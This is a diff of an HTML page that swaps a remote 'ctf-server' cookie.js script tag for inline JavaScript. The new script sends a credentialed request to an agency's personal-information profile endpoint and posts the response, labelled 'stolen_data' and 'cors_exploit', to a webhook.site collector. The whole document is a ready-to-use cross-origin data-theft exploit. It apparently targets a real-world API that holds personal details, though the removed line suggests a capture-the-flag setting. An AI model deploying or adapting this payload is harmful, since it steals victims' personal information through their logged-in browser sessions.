@@ -1,6 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script src="https://alakinnn.github.io/ctf-server/cookie.js"></script>
-  </body>
+<body>
+<script>
+fetch('/ketnoi/api/profile/agency-personal-information/get-detail-profile', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        "producerCode":"330080185",
+    })
+})
+.then(response => response.text())
+.then(data => {
+    console.log("Response:", data);
+    
+    fetch('https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1/receive', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            stolen_data: data,
+            source: 'cors_exploit'
+        })
+    })
+    .catch(err => console.log('Webhook failed:', err));
+})
+.catch(err => console.log('Main request failed:', err));
+</script>
+</body>
 </html>
